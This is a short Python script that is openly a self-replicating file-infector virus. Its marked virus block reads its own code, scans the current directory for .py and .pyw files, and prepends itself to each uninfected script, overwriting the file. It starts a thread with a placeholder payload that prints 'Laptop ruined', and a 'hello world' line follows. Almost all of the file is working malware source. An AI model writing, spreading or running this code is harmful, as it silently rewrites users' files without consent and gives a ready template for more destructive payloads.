### START OF VIRUS ###
import sys
import glob
import threading

code = []
# opening the current python file, to get the virus code we'll want to inject
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False

for line in lines:
    if line == '### START OF VIRUS ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### END OF VIRUS ###\n':
        break

# code[] now contains the virus code

# list of file names that are python
python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

# this self-replicating part should be inside the script so it can spread the virus
for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        # if already infected
        if line == '### START OF VIRUS ###\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)
        with open(script, 'w') as f:
            f.writelines(final_code)

# Malicious piece of code (Payload)


def payload():
    for x in range(5):
        print("Laptop ruined")


# should be in a new thread so it can run
t1 = threading.Thread(target=payload)
t1.start()

### END OF VIRUS ###

print("hello world")
